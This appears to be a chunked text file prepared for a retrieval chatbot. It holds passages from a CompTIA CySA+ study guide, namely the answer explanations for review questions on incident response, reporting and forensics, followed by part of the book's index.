rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the organization is to purge it. 11. B. New firewall rules, if required, would be implemented during the eradication and recovery phase. The validation phase includes verifying accounts and permissions, verifying that logging is working properly, and conducting vulnerability scans. 12. D. The primary purpose of eradication is to remove any of the artifacts of the incident that may remain on the organization’s network. This may include the removal of any malicious code from the network, the sanitization of compromised media, and the securing of compromised user accounts. 13. B. There are many potential uses for written incident reports. First, it creates an institutional memory of the incident that is useful when developing new security controls and training new security team members. Second, it may serve as an important record of the incident if there is ever legal action that results from the incident. These reports should be classified and not disclosed to external parties. 14. D. Malware signatures would not normally be included in an evidence log. The log would typically contain identifying information (e.g., the location, serial number, model number, hostname, MAC addresses and IP addresses of a computer), the name, title and phone number of each individual who collected or handled the evidence during the investigation, the time and date (including time zone) of each occurrence of evidence handling, and the locations where the evidence was stored. 15. D. Even removing a system from the network doesn’t guarantee that the attack will not continue. In the example given in this chapter, an attacker can run a script on the server that detects when it has been removed from the network and then proceeds to destroy data stored on the server. 16. A. The data disposition flowchart in Figure 11.7 directs that any media containing highly sensitive information that will leave the control of the organization must be destroyed. Joe should purchase a new replacement device to provide to the contractor. 17. B. Incident reports should include a chronology of events, estimates of the impact, and documentation of lessons learned, in addition to other information. Incident response efforts should not normally focus on uncovering the identity of the attacker, so this information would not be found in an incident report. 18. D. NIST SP 800-­61 is the Computer Security Incident Handling Guide. NIST SP 800-­53 is Security and Privacy Controls for Federal Information Systems and Organizations. NIST SP 800-­88 is Guidelines for Media Sanitization. NIST SP 800-­18 is the Guide for Developing Security Plans for Federal Information Systems. 19. A. Resetting a device to factory state is an example of a data clearing activity. Data purging activities include overwriting, block erase, and cryptographic erase activities when performed through the use of dedicated, standardized device commands. Chapter 12: Reporting and Communication 509 20. A. Only removal of the compromised system from the network will stop the attack against other systems. Isolated and/or segmented systems are still permitted access to the Internet and could continue their attack. Detection is a
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	800-­88 is Guidelines for Media Sanitization. NIST SP 800-­18 is the Guide for Developing Security Plans for Federal Information Systems. 19. A. Resetting a device to factory state is an example of a data clearing activity. Data purging activities include overwriting, block erase, and cryptographic erase activities when performed through the use of dedicated, standardized device commands. Chapter 12: Reporting and Communication 509 20. A. Only removal of the compromised system from the network will stop the attack against other systems. Isolated and/or segmented systems are still permitted access to the Internet and could continue their attack. Detection is a purely passive activity that does not disrupt the attacker at all. Chapter 12: Reporting and Communication 1. C. NIST guidelines note that predetermined communications ensure that appropriate communications are shared with the right parties. 2. B. Information about recurrence will help Valentine determine if there is an ongoing issue with the patching program. For example, recurrence might demonstrate that the underlying base images for systems were not being patched, resulting in vulnerabilities when new instances of an image are being deployed. 3. A. Security operations and oversight stakeholders will likely want to ingest vulnerability management data to perform data enrichment activities for other security systems. Audit and compliance, system administration, and management stakeholders are more likely to want written reports to review and use in their roles. 4. D. Communication with stakeholders should occur during all phases of the NIST IR cycle to ensure that they are aware and participating as required. 5. B. Simply knowing the volume of alerts for an organization is not a useful metric without context. It may indicate that the organization has a poorly tuned alerting system, that the system does not detect most events, or that there are other issues. Mean time to detect, mean time to respond, and mean time to remediate provide more useful information, although each requires context as well. 6. D. Service level agreements (SLAs) often have performance targets like uptime included. Organizations that need to meet an SLA may delay patching to ensure they meet their overall uptime guarantees. SLAs and patching are not typically used to force vendor compliance or to ensure license compliance, nor are they likely to impact organizational governance targets. 7. B. Ian’s desire to ensure patches across his infrastructure points to a need for a configuration management tool that can be used to deploy patches at scale. A vulnerability scanner doesn’t install patches, baseline configuration scanners help determine whether the baseline is being met but won’t help maintain the baseline, and EDR is used to detect malicious software and activity, not to patch or maintain a patch level. 8. A. Impact assessments focus on describing what the incident means to the organization including financial, reputational, or other impacts. Timeline, scope, and recommendations all help describe the incident but don’t focus on impact. 510 9. Appendix ■ Answers to Review Questions C. Memorandums of understanding (MOUs) are often associated with performance or uptime targets that
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	patches at scale. A vulnerability scanner doesn’t install patches, baseline configuration scanners help determine whether the baseline is being met but won’t help maintain the baseline, and EDR is used to detect malicious software and activity, not to patch or maintain a patch level. 8. A. Impact assessments focus on describing what the incident means to the organization including financial, reputational, or other impacts. Timeline, scope, and recommendations all help describe the incident but don’t focus on impact. 510 9. Appendix ■ Answers to Review Questions C. Memorandums of understanding (MOUs) are often associated with performance or uptime targets that may not be met if systems are taken offline for patching. Jaime should review her infrastructure designs, MOUs, and patching processes to determine if they are all appropriate to what her organization can accomplish and needs to do to stay secure. 10. C. Detailed evidence like logs are typically attached as evidence in an appendix. 11. C. A lessons learned exercise is used to ensure that organizations leverage their findings and experiences from incidents. Media training is useful, and a need for it might be a lesson learned, but it is not a typical follow-­up. Reporting to the government or auditors is also not a typical process improvement step after an incident. 12. A. Training is most commonly associated with the Preparation phase of the IR life cycle. Conducting media training during an incident is not a common practice. 13. C. Root cause analysis exercises are not designed or intended to determine who to blame. Instead, they focus on identifying the root cause so that it can be remediated. 14. C. Internal requirements are unlikely to require an incident report in a specific timeline, as they typically acknowledge the complexity of incident response. While the media may want a report in a specific timeframe, that does not require a response. Instead, of the listed items, regulatory compliance is the primary driver for reporting in a specific timeline for most organizations. 15. B. The best option that Jim has will likely be to identify a compensating control. This may not be a suitable solution in the long term, and Jim’s organization may need to change their service or design to allow for the security fix to be put in place. Organizational governance won’t change the functional impact, no legacy system is mentioned, nor is there an SLA listed in the question. 16. A. NIST acknowledges the necessity of dealing with the media and recommends media training, establishing procedures for briefing the media, maintaining an IR status document or statement, preparing staff for media contact and requests for information, and holding ongoing practice sessions for incident responders as part of IR exercises. 17. B. Post-­Incident Activity typically includes the incident report in the NIST IR life cycle. 18. C. Chris knows that a zero-­day vulnerability means that the scanner won’t have had a rule or detection profile for the vulnerability. That means that previously run reports and scans won’t show it. It’s
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	16. A. NIST acknowledges the necessity of dealing with the media and recommends media training, establishing procedures for briefing the media, maintaining an IR status document or statement, preparing staff for media contact and requests for information, and holding ongoing practice sessions for incident responders as part of IR exercises. 17. B. Post-­Incident Activity typically includes the incident report in the NIST IR life cycle. 18. C. Chris knows that a zero-­day vulnerability means that the scanner won’t have had a rule or detection profile for the vulnerability. That means that previously run reports and scans won’t show it. It’s possible that their vendor may release a detection profile or rule for the zero-­day, but with very little time from release to the request, that is unlikely to have occurred already. Rerunning reports won’t show unknown vulnerabilities, and zero-­day vulnerabilities can be detected if there’s a rule. 19. A. Mikayla knows that awareness and education are the first step to ensuring that staff are aware of the importance of patching. Her first step should be ensuring appropriate awareness, education, and training are in place. There is no indication of changing business requirements, compensating controls should only be used if they are needed, not as a general practice, and punishment is unlikely to resolve the underlying issues. Chapter 13: Performing Forensic Analysis and Techniques for Incident Response 511 20. D. Geeta should identify a compensating control that will appropriately ensure the security of the system with minimal impact to its functionality. Examples might be placing a network firewall logically in front of the device, moving it to an isolated and secured network segment or VLAN, or otherwise adding protection. Marking the vulnerability as unable to be remediated does not protect the system or the company, shutting it off will impact the organization’s ability to function, and installing the patches may cause functional issues or prevent vendor support. Chapter 13: Performing Forensic Analysis and Techniques for Incident Response 1. B. dd creates files in RAW, bit-­by-­bit format. EN01 is the EnCase forensic file format, OVF is virtualization file format, and ddf is a made-­up answer. 2. A. Once a root cause analysis is done, lessons learned are often documented to ensure that future similar issues are avoided. Architecture diagrams and updated processes may be part of those lessons learned. A list of current legal holds is not typically part of this process. 3. C. Whereas root cause analysis may involve cost–benefit analysis before controls or fixes are put in place, risk assessment is typically a separate process. 4. C. Write blockers ensure that no changes are made to a source drive when creating a forensic copy. Preventing reads would stop you from copying the drive, drive cloners may or may not have write blocking capabilities built in, and hash validation is useful to ensure contents match but don’t stop changes to the source drive from occurring. 5. B. A legal hold is a process used to preserve all data related to pending
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	3. C. Whereas root cause analysis may involve cost–benefit analysis before controls or fixes are put in place, risk assessment is typically a separate process. 4. C. Write blockers ensure that no changes are made to a source drive when creating a forensic copy. Preventing reads would stop you from copying the drive, drive cloners may or may not have write blocking capabilities built in, and hash validation is useful to ensure contents match but don’t stop changes to the source drive from occurring. 5. B. A legal hold is a process used to preserve all data related to pending legal action or when legal action may be expected. A retainer is paid to a lawyer to keep them available for work. The other two terms were made up for this question. 6. B. A root cause analysis is often performed to identify what went wrong and why. Lessons learned are then identified and applied to ensure the organization doesn’t experience the same issue in the future. Blame assignment is not a part of a forensic procedure and is typically discouraged in most organizations. Reverse hashing isn’t possible, as hashes are one-­ way functions. Legal holds are associated with legal action, not incident response forensics. 7. A. Timelines are one of the most useful tools when conducting an investigation of a compromise or other event. Forensic tools provide built-­in timeline capabilities to allow this type of analysis. 8. D. Since Danielle did not hash her source drive prior to cloning, you cannot determine where the problem occurred. If she had run MD5sum prior to the cloning process as well as after, she could verify that the original disk had not changed. 512 9. Appendix ■ Answers to Review Questions D. The Volatility Framework is designed to work with Windows, macOS, and Linux, and it provides in-­depth memory forensics and analysis capabilities. LiME and fmem are Linux tools, whereas DumpIt is a Windows-­only tool. 10. D. Lisa has discovered an issue with chain of custody documentation. Each transfer, forensic action, or other change or event that occurs should be logged as part of a chain of custody. 11. B. Validating data integrity ensures that images or files are forensically sound and have not been altered or modified either on purpose or accidentally during the forensic acquisition and analysis process. It does not ensure the system has not been compromised, and although artifacts can be assessed to validate file versions, typically they are not used to validate operating system versions. Finally, legal holds require data preservation, not data integrity validation. 12. D. Manual access is used when phones cannot be forensically imaged or accessed as a volume or filesystem. Manual access requires that the phone be reviewed by hand, with pictures and notes preserved to document the contents of the phone. 13. A. CCleaner is a PC cleanup utility that wipes Internet history, destroys cookies and other cached data, and can impede forensic investigations. CCleaner may be an indication of intentional antiforensic
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	artifacts can be assessed to validate file versions, typically they are not used to validate operating system versions. Finally, legal holds require data preservation, not data integrity validation. 12. D. Manual access is used when phones cannot be forensically imaged or accessed as a volume or filesystem. Manual access requires that the phone be reviewed by hand, with pictures and notes preserved to document the contents of the phone. 13. A. CCleaner is a PC cleanup utility that wipes Internet history, destroys cookies and other cached data, and can impede forensic investigations. CCleaner may be an indication of intentional antiforensic activities on a system. It is not a full-­disk encryption tool or malware packer, nor will it modify MAC times. 14. B. Unallocated space is typically not captured during a live image, potentially resulting in data being missed. Remnant data from the tool, memory and drive contents changing while the image is occurring, and malware detecting the tool are all possible issues. 15. D. Jeff did not create the image and cannot validate chain of custody for the drive. This also means he cannot prove that the drive is a copy of the original. Since we do not know the checksum for the original drive, we do not have a bad checksum or a hash mismatch—­there isn’t an original to compare it to. Antiforensic activities may have occurred, but we cannot determine that from the question. 16. A. Imaging the system while the program is live has the best probability of allowing Jeff to capture the encryption keys or decrypted data from memory. An offline image after the system is shut down will likely result in having to deal with the encrypted file. Brute-­force attacks are typically slow and may not succeed, and causing a system crash may result in corrupted or nonexistent data. 17. A. The tcpdump utility is a command-­line packet capture tool that is found on many Linux systems. Wireshark is a GUI tool available for most operating systems. Netdd and snifman were made up for this question. 18. A. Ben is maintaining chain of custody documentation. Chris is acting as the validator for the actions that Ben takes and acts as a witness to the process. 19. D. While AES does have a hashing mode, MD5, SHA1, and built-­in hashing tools in FTK and other commercial tools are more commonly used for forensic hashes. 20. B. Both cloud and virtualized environments are often temporary (ephemeral) and thus can be difficult to perform forensics on. If you have a cloud, virtualized, or containerized environment, make sure you have considered how you would perform forensics, and what data preservation techniques you may need to use. Index A abnormal account activity, 121 abnormal OS process behavior, 96 AbuseIPDB, 114 acceptable use policy (AUP), 327 access, Generally Accepted Privacy Principles (GAPP) for, 6 access control list (ACL), 15, 181 AccessChk, 98 accidental threats, 9 accounts introducing new, 101, 104 management policy for, 327 unusual behaviors for, 383–384 acquisition of data,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Both cloud and virtualized environments are often temporary (ephemeral) and thus can be difficult to perform forensics on. If you have a cloud, virtualized, or containerized environment, make sure you have considered how you would perform forensics, and what data preservation techniques you may need to use. Index A abnormal account activity, 121 abnormal OS process behavior, 96 AbuseIPDB, 114 acceptable use policy (AUP), 327 access, Generally Accepted Privacy Principles (GAPP) for, 6 access control list (ACL), 15, 181 AccessChk, 98 accidental threats, 9 accounts introducing new, 101, 104 management policy for, 327 unusual behaviors for, 383–384 acquisition of data, 470–472 of evidence, 388–389, 405 action plans, 426 actions on objectives, as stage in Lockheed Martin’s Cyber Kill Chain, 365, 366 active defense, for threat hunting, 151 Active Directory Federation Services (AD FS), 61, 62–63 active monitoring, 81–82 active reconnaissance, 161–162 active scanning, 212 Advanced Intrusion Detection Environment (AIDE), 92 advanced persistent threat (APT), 9, 146, 357 Advanced RISC Machine (ARM), 45 adversarial threats, 9 adversary capability, 305 adverse events, 344 affected hosts, 425 African Network Information Center (AFIRINC), 186 agent-­based NAC solutions, 13 agent-­based scanning, 217 agentless NAC solutions, 13 Agile development model, 315–316 air gaps, 49 alert volume, 436–437 alerts, 347 AlienVault’s Open Threat Exchange (OTX), 153, 379–380 American Registry for Internet Numbers (ARIN), 187 analysis and requirements definition phase, in software development life cycle (SDLC), 311 analyzing code, 322–325 CVSS vector activity, 285–287 email, 115–119 files, 119–120 images, 474–478 indicators of compromise (IOCs), 150 network events, 78–90 phishing email activity, 129–130 risk, 294–300 utilities for, 452 vulnerability scans, 245–291 Angry IP Scanner, 171–172 annualized loss expectancy (ALE), 297 annualized rate of occurrence (ARO), 297 anomalous activity, 102–103 anomaly-­based detection, 85 answers to review questions containment, eradication, and recovery, 507–509 forensic analysis and techniques, for incident response, 511–512 incident detection and analysis, 505–507 incident response programs, 503–504 malicious activity, 492–493 reconnaissance and intelligence gathering, 495–497 reporting and communication, 509–511 system and network architecture, 490–491 threat intelligence, 493–495 vulnerabilities, 501–503 vulnerability management programs, 497–499 vulnerability scans, 499–500 antimalware tools, 95 antivirus tools, 95 appliances, for security, 110–111 application, of IOCs, 150 application and service issue response plan activity, writing, 129 514 application logs – calculating application logs, 101, 104, 183 application programming interfaces (APIs), 29 application-­related issues, investigating, 100–104 applications behavior analysis of, 103 error monitoring of, 103 generation of, in Rapid Application Development (RAD) model, 317 monitoring, 100–101 patching, 407–408 applying threat intelligence, 148–151 Arachni, 235 architecture, hardware, 45 artificial intelligence (AI), 114 Asia-­Pacific Network Information Centre (APNIC), 187 assessing attack frameworks, 366–367 security risks, 6–12 software, 322–325 supply chain, 299–300 threat intelligence, 140–141 asset criticality, 210 asset discovery, 160-­161 asset inventory, 209 asset value (AV), 260, 297 attack complexity (AC) metric, 250–251 attack frameworks about, 361 assessing, 366–367 developing testing strategies, 367 Diamond Model of Intrusion Analysis, 362–364 Lockheed Martin’s Cyber Kill Chain, 364–366 MITRE’s ATT&CK Framework, 361–362, 363 Unified Kill Chain, 366–367 attack surface, 50, 69, 308–309 attack surface reduction, 308 attack vector (AV) metric, 250
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	patching, 407–408 applying threat intelligence, 148–151 Arachni, 235 architecture, hardware, 45 artificial intelligence (AI), 114 Asia-­Pacific Network Information Centre (APNIC), 187 assessing attack frameworks, 366–367 security risks, 6–12 software, 322–325 supply chain, 299–300 threat intelligence, 140–141 asset criticality, 210 asset discovery, 160-­161 asset inventory, 209 asset value (AV), 260, 297 attack complexity (AC) metric, 250–251 attack frameworks about, 361 assessing, 366–367 developing testing strategies, 367 Diamond Model of Intrusion Analysis, 362–364 Lockheed Martin’s Cyber Kill Chain, 364–366 MITRE’s ATT&CK Framework, 361–362, 363 Unified Kill Chain, 366–367 attack surface, 50, 69, 308–309 attack surface reduction, 308 attack vector (AV) metric, 250 attackers identifying, 405–406 isolating, 403 attribute release request, 59–60 attrition, as threats, 357 Australian Signals Directorate’s Cyber Security Centre, 138 authentication, 281–283, 320, 321 authentication, authorization, and accounting (AAA), 53 authenticator, 13 Automated Indicator Sharing (AIS) program (CISA), 137 automating cybersecurity, 28 portions of incident response playbooks, 30–31 autonomous system (AS) numbers, 187 Autopsy, 452 Availability, in CIA Triad, 4–5 availability metric, 252–253 avoiding brute force, 467–468 awareness, employee, 428 AWS Elastic Compute Cloud (EC2), 230 B backlogs, 316 bandwidth consumption, 83–84 base score, calculating, 255 baselines, 85 Bash, 122 beaconing, 84–85 behavioral assessments, 306 behavior-­based detection, 85 best practices, for software assurance, 310–318 biometric factors, multifactor authentication (MFA) and, 54 blogs, 139 Border Gateway Protocol (BGP), 185 bot-­like behaviors, 384 bring-­your-­own-­device (BYOD), 465 brute force, avoiding, 467–468 buffer overflows, 264–265 bug bounty programs, 308–309 Burp Proxy, 237 Burp Suite, 237 business impact analysis (BIA), 297 business modeling, in Rapid Application Development (RAD) model, 317 business process interruption, 430 business requirements, changing, 428 C cables, 450 caching devices, as on-­premises network architecture, 47 CAINE, 452 calculating base score, 255 exploitability score, 255 camera – containment impact score, 254 impact sub-­score (ISS), 254 camera, 450 card holder data (CHD), 68 carving, 452–453 categories CVSS base score, 255–256 security control, 303–304 cell phones, forensics for, 456 Center for Internet Security (CIS), 41, 207–208 Central Authentication Service (CAS), 56 certificate problems, 271–273 certificate revocation, 67 chain of custody, 388, 454, 467 change control, managing processes, 411 change management, 227, 309 choice, Generally Accepted Privacy Principles (GAPP) for, 6 CIA Triad, 4–5 ciphers, 270–271 Cisco routers, 27 Talos Intelligence, 306 threat security site, 137 classification of incidents, 356–361 of severity, 358–361 of threats, 146–148, 305–307, 357–358 Clear option, for secure disposal, 408 closed source intelligence, 139–140 cloud infrastructure scanning tools, 229–233 mapping and scanning, 163 network architecture, 48–49 service forensics, 460–461 cloud access security brokers (CASBs), 49, 65 code of conduct/ethics, 327 code/coding analyzing, 322–325 detonation of, 25 for security, 319–321 security best practice, 320–321 testing, 322–325 collection Generally Accepted Privacy Principles (GAPP) for, 6 of indicators of compromise (IOCs), 150 command and control (C2), as stage in Lockheed Martin’s Cyber Kill Chain, 365–366 command-­and-­control (C&C) system, 80, 84, 115 Common Configuration Enumeration (CCE), 220 515 Common Platform Enumeration (CPE), 220 Common Vulnerabilities and Exposures (CVE), 136, 220 Common Vulnerability Scoring System (CVSS) about, 221, 225, 249, 250 attack complexity (AC) metric, 250–251 attack
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	163 network architecture, 48–49 service forensics, 460–461 cloud access security brokers (CASBs), 49, 65 code of conduct/ethics, 327 code/coding analyzing, 322–325 detonation of, 25 for security, 319–321 security best practice, 320–321 testing, 322–325 collection Generally Accepted Privacy Principles (GAPP) for, 6 of indicators of compromise (IOCs), 150 command and control (C2), as stage in Lockheed Martin’s Cyber Kill Chain, 365–366 command-­and-­control (C&C) system, 80, 84, 115 Common Configuration Enumeration (CCE), 220 515 Common Platform Enumeration (CPE), 220 Common Vulnerabilities and Exposures (CVE), 136, 220 Common Vulnerability Scoring System (CVSS) about, 221, 225, 249, 250 attack complexity (AC) metric, 250–251 attack vector (AV) metric, 250 availability metric, 252–253 confidentiality metric, 252 integrity metric, 252 interpreting vector, 253–254 privileges required (PR) metric, 251 scope metric, 253 summarizing scores, 254–256 user interaction (UI) metric, 251 communicating results from penetration tests, 24 vulnerability management and, 222–224 community, threat intelligence, 145–146 compensating controls, 20, 225, 304, 331–332, 407, 427–428 compiler, 25–26 compliance reporting, 426 components, insecure, 320 computer emergency response team (CERT), 139 Computer Security Incident Handling Guide, 400, 403, 406 computer security incident response teams (CSIRTs), 345 computing environment, managing, 307–310 Confidence Value, in Diamond Model of Intrusion Analysis, 362 Confidentiality, in CIA Triad, 4–5 confidentiality metric, 252 configuration analysis of, 175–183 default, 320 management of, 259, 309, 427 modifications to, 384–385 network devices, 177 vulnerability scans, 213–221 weak, 320 consent, Generally Accepted Privacy Principles (GAPP) for, 6 consumer, 57 container forensics, 461–462 containerization, 39–40 containment, eradication, and recovery about, 348–349, 398, 412–413 answers to review questions, 507–509 containing damage, 398–406 516 content filtering – Destroy option exam essentials, 413 incident eradication and recovery, 406–409 lab exercises, 414–416 response, 410–412 review questions, 417–420 validating data integrity, 410 content filtering, as on-­premises network architecture, 47 context awareness, 259–260 continuous deployment (CD), 318 continuous integration (CI), 318 continuous monitoring, 222, 327 controls, reviewing, 12 core dumps, 471–472 Core Features, in Diamond Model of Intrusion Analysis, 362 corporate policy, on vulnerability management, 207 corrective controls, 304 correlation, 105 country code top-­level domain (ccTLD), 186 credential scanning, 216–217 credential stuffing attacks, 282 critical infrastructure and operational technology, 275 critical vulnerabilities, 429 cross-­site request forgery (CSRF/XSRF) attacks, 233, 281 cross-­site scripting (XSS), 233, 277–279 cryptographic failures, 270–273 cryptography tools, 457–458 Cuckoo Sandbox, 120 customer commitments, 227 customer communication, 433 CVSS base score, categorizing, 255–256 CVSS scores, summarizing, 254–256 CVSS vectors analyzing activity, 285–287 interpreting, 253–254 Cyber Incident Reporting for Critical Infrastructure Act of 2022 (CIRCIA), 434 cybersecurity, automating, 28 cybersecurity analytics about, 4, 31–32 building secure networks, 12–19 cybersecurity objectives, 4–5 efficiency and process improvement, 27–31 evaluating security risks, 6–12 exam essentials, 32–33 future of, 31 lab exercises, 33–36 penetration testing, 21–24 privacy versus security, 5–6 reverse engineering, 25–27 secure endpoint management, 19–21 cybersecurity incident response team (CSIRT), 139, 345 D damage, containment of, 398–406 dark web, 139 darknets, 151 data acquiring, 470–472 harvesting from DNS and Whois, 184–190 data classification, 209, 327 data collection, in threat intelligence life cycle, 145 data exfiltration, 83–84, 96–97 data formats, 121–126 data
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Critical Infrastructure Act of 2022 (CIRCIA), 434 cybersecurity, automating, 28 cybersecurity analytics about, 4, 31–32 building secure networks, 12–19 cybersecurity objectives, 4–5 efficiency and process improvement, 27–31 evaluating security risks, 6–12 exam essentials, 32–33 future of, 31 lab exercises, 33–36 penetration testing, 21–24 privacy versus security, 5–6 reverse engineering, 25–27 secure endpoint management, 19–21 cybersecurity incident response team (CSIRT), 139, 345 D damage, containment of, 398–406 dark web, 139 darknets, 151 data acquiring, 470–472 harvesting from DNS and Whois, 184–190 data classification, 209, 327 data collection, in threat intelligence life cycle, 145 data exfiltration, 83–84, 96–97 data formats, 121–126 data integrity, validating, 388–389, 410, 465, 468 Data Leakage Case, 473 data loss prevention (DLP) solutions, 67, 68 data modeling, in Rapid Application Development (RAD) model, 317 data ownership policy, 327 data poisoning, 283 data processing and analysis, in threat intelligence life cycle, 145 data protection. See encryption data retention policy, 327 datatypes, 360–361 dd utility, imaging with, 466–467 debug modes, 268–269 debuggers, 325 deception, defense through, 18–19 declaration, of incidents, 432 decompiler, 26 deep web, 139 defense, through deception, 18–19 degrading functionality, 430 delayed remediation options, 225 delivery, as stage in Lockheed Martin’s Cyber Kill Chain, 364–365 demilitarized zone (DMZ), 14–15 denial-­of-­service (DoS) attacks, 7, 87–88, 298, 385–386 dereferencing, 319 design federated identities and, 59–61 for security, 319–321 in software development life cycle (SDLC), 311 Destroy option, for secure disposal, 409 detection – endpoint management detection common network issues, 82–86 denial-­of-­service (DoS) attacks, 87–88 distributed denial-­of-­service (DDoS) attacks, 87–88 network attacks, 88 rogue devices, 88–90 scans, 86–87 sweeps, 86–87 threat intelligence and, 142 detection and analysis phase, of incident response, 347–348 detective controls, 304 development models, software, 313–317 development phase, in software development life cycle (SDLC), 311 device fingerprinting, 167–168, 194 DevOps, 318 DevSecOps, 318 Diamond Model of Intrusion Analysis, 362–364 DigiNinja, 188 digital forensics workstation, 449 digital signatures, 117 directory traversal attacks, 279–280 Dirty COW, 265–266 disclosure, Generally Accepted Privacy Principles (GAPP) for, 6 discovery, conducting, 23 discretionary access control (DAC), 21 disk forensics, 456 disk images, creating, 481–482 disposal during eradication and recovery phases, 408–409 Generally Accepted Privacy Principles (GAPP) for, 6 disposition phase, in software development life cycle (SDLC), 312 distributed denial-­of-­service (DDoS) attacks, 87–88, 301–302 Docker, 39 documentation forms and checklists, 450 documentation tools, 450 documented exceptions, 257 documenting incident response plan, 353–354 Domain Name System (DNS) DNS amplification attack, 386 DNS brute forcing, 189 DNS discovery, 187 DNS entries, 187 DNS reputation services, 112–114 DNS sinkholes, 19 517 DNS tunneling, 387 harvesting data from, 184–190 unusual DNS traffic, 387 Domain Tools, 190 domain transfer scams, 186 Domain-­Based Message Authentication, Reporting, and Conformance (DMARC), 118 DomainKeys Identified Mail (DKIM), 118 domains, 186–187 Don’t Route or Peer lists (DROP), 138 drive adapters, 450 drives consumption and monitoring of capacity, 92 imaging, 452 DumpIt, 471 dynamic code analysis, 322 Dynamic Host Configuration Protocol (DHCP) logs and files, 180–181 E echo request, 163–165 edge discovery scanning, 308 eDiscovery, 388 education, of employees, 428 efficiency, improving, 27–31 802.1X protocol, 13
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	discovery, 187 DNS entries, 187 DNS reputation services, 112–114 DNS sinkholes, 19 517 DNS tunneling, 387 harvesting data from, 184–190 unusual DNS traffic, 387 Domain Tools, 190 domain transfer scams, 186 Domain-­Based Message Authentication, Reporting, and Conformance (DMARC), 118 DomainKeys Identified Mail (DKIM), 118 domains, 186–187 Don’t Route or Peer lists (DROP), 138 drive adapters, 450 drives consumption and monitoring of capacity, 92 imaging, 452 DumpIt, 471 dynamic code analysis, 322 Dynamic Host Configuration Protocol (DHCP) logs and files, 180–181 E echo request, 163–165 edge discovery scanning, 308 eDiscovery, 388 education, of employees, 428 efficiency, improving, 27–31 802.1X protocol, 13 Elastic Block Store (EBS), 230 Elasticsearch, Logstash, and Kibana (ELK), 105 ElcomSoft, 457 ELK (Elasticsearch, Logstash, and Kibana), 105 email protecting and analyzing, 115–119 as threats, 357 embedded links, 117 employee awareness, 428 employee education, 428 employee training, 428 enable command, 182 EnCase, 454, 471 encrypted drives, handling, 467 encryption about, 65–66 public key infrastructure (PKI), 66–67 Secure Sockets Layer (SSL) inspection, 67–68 techniques for, 321 end-­of-­life (EOL) vulnerabilities, 263–264 endpoint detection and response (EDR), 95, 110 endpoint forensics, conducting, 455–458 endpoint management, 19–21 518 endpoint vulnerabilities – files endpoint vulnerabilities, 261–269 enforcement, Generally Accepted Privacy Principles (GAPP) for, 6 enumeration, 160–161 environmental threats, 9 eradication phase about, 406–407 patching systems and applications, 407–408 remediation and reimaging, 407 sanitization and secure disposal, 408–409 error handling, improper, 319 escalation of incidents, 432 of privileges, 384 European Union (EU) General Data Protection Regulation (GDPR), 6 evaluating attack frameworks, 366–367 security risks, 6–12 software, 322–325 supply chain, 299–300 threat intelligence, 140–141 event logs, 106 Event Viewer, 106 events defined, 344 network, 78–90 evidence about, 439 acquisition and handling of, 405 acquisition and preservation of, 388–389 procedures for, 330 retention of, 350–351, 412 evidence acquisition about, 465 acquiring other data, 470–472 forensic copies, 465–466 handling encrypted drives, 467–468 imaging live systems, 468–469 imaging with dd, 466–467 reimaging systems, 469 using write blockers, 468 validating data integrity, 468 exam essentials containment, eradication, and recovery, 413 cybersecurity analytics, 32–33 forensic analysis and techniques, for incident response, 481 incident detection and analysis, 390 incident response programs, 368–369 malicious activity, 127–128 reconnaissance and intelligence gathering, 192–193 reporting and communication, 440 system and network architecture, 70 threat intelligence, 152–153 vulnerabilities, 333–334 vulnerability management, 238–239 vulnerability scans, 284–285 exceptions, 331–332 executive summary, 437 exercises, for penetration tests, 24 exploitability score, calculating, 255 exploitation, as stage in Lockheed Martin’s Cyber Kill Chain, 365 Exploits Block List (XBL), 138 exposure factor (EF), 297 expressions, regular, 123–125 Extensible Configuration Checklist Description Format (XCCDF), 221 external scans, 217 external/removable media, as threats, 357 F Facebook Connect, 56 false negative, 215 false positives, 215, 256–257 fault injection, 323 feasibility phase, in software development life cycle (SDLC), 311 Federal Information Processing Standard (FIPS), 205–206 Federal Information Security Management Act (FISMA), 205–207 federation about, 56–57 Active Directory Federation Services (AD FS), 62–63 federated identity design choices, 59–61 federated identity security considerations, 57–58 federated identity technologies, 61–64 OAuth, 63–64 OpenID Connect, 64 Security Assertion Markup Language (SAML), 62
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Chain, 365 Exploits Block List (XBL), 138 exposure factor (EF), 297 expressions, regular, 123–125 Extensible Configuration Checklist Description Format (XCCDF), 221 external scans, 217 external/removable media, as threats, 357 F Facebook Connect, 56 false negative, 215 false positives, 215, 256–257 fault injection, 323 feasibility phase, in software development life cycle (SDLC), 311 Federal Information Processing Standard (FIPS), 205–206 Federal Information Security Management Act (FISMA), 205–207 federation about, 56–57 Active Directory Federation Services (AD FS), 62–63 federated identity design choices, 59–61 federated identity security considerations, 57–58 federated identity technologies, 61–64 OAuth, 63–64 OpenID Connect, 64 Security Assertion Markup Language (SAML), 62 feedback, in threat intelligence life cycle, 145 file inclusion attacks, 280 File Transfer Protocol (FTP), 267–268 files analyzing, 119–120 hibernation, 471–472 filesystems – Honeynet project modifications to, 384–385 structure and location of, 43–44 filesystems, changes and anomalies in, 92 final reports, developing, 411–412 fingerprinting device, 167–168 operating system, 167–168 software for, 26 firewall logs, 108 firewalls about, 14–17 logs and configuration files, 181–183 as on-­premises network architecture, 47 firmware, missing updates for, 269–270 fixes, testing and implementing, 225 fmem, 471 forensic analysis and techniques, for incident response about, 349, 448, 480–481 answers to review questions, 511–512 building forensics capability, 448–450 cloud, virtual, and container forensics, 460–462 conducting, 463 conducting endpoint forensics, 455–458 exam essentials, 481 forensic investigation example, 472–480 forensic software, 450–455 lab exercises, 481–483 